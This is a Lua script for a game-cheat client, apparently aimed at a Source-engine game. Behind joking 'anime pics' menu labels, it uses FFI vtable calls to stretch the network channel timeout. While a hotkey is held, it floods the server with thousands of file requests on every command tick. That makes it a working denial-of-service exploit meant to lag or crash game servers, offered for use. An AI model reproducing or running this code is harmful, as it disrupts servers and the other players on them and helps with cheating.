--[[
	id: g8hVq1g6SeikV3FAbtfJY
	name: asdasd
	description: asddsad
	time1: 2021-05-12 18:11:09.959843+00
	time2: 2021-05-12 18:11:09.959843+00
	uploader: rD_skqxaDw2-V7aDHR5FqmlkzMEd0LLNZqsGBqXx
	uploadersession: crCXhasjszQ8gCUYA3hWKHiDEIH8yq
	flag: f
--]]

local checkbox = ui.new_checkbox("LUA", "B", "Cute anime girls pics")
local hotkey = ui.new_hotkey("LUA", "B", "Fuck anime girls", true)

local ffi = require('ffi')

ffi.cdef[[
    typedef void*(__thiscall* getnetchannel_t)(void*); // engineclient 78

    typedef void(__thiscall* set_timeout_t)(void*, float, bool); // netchan 31
    typedef unsigned int(__thiscall* request_file_t)(void*, const char*, bool); // netchan 62
]]

local engineclient = ffi.cast(ffi.typeof("void***"), client.create_interface("engine.dll", "VEngineClient014"))
local getnetchannel = ffi.cast("getnetchannel_t", engineclient[0][78])
local netchannel = {}

do
    function vfunc_wrapper(type, index)
        return function(...)
            -- only did this for netchannel, you can probably extend it to make it a proper wrapper
            local netchannel = ffi.cast(ffi.typeof("void***"), getnetchannel(engineclient))
            local fn = ffi.cast(type, netchannel[0][index])

            return fn(netchannel, ...)
        end
    end

    netchannel.set_timeout = vfunc_wrapper("set_timeout_t", 31)
    netchannel.request_file = vfunc_wrapper("request_file_t", 62)
end

local function on_setup_command()
    netchannel.set_timeout(3600, false);
    
    if ui.get(hotkey) then
        client.color_log(255, 0, 0, "[anime] Sending cute pics");

        for i=1, 4192 do
            netchannel.request_file(".txt", false);
        end
    end
end

local function update_callback(elem)
    local enabled = ui.get(elem)
    local set_callback = enabled and client.set_event_callback or client.unset_event_callback
    
    set_callback('setup_command', on_setup_command)
end

ui.set_callback(checkbox, function(elem)
    update_callback(elem)
end)

update_callback(elem)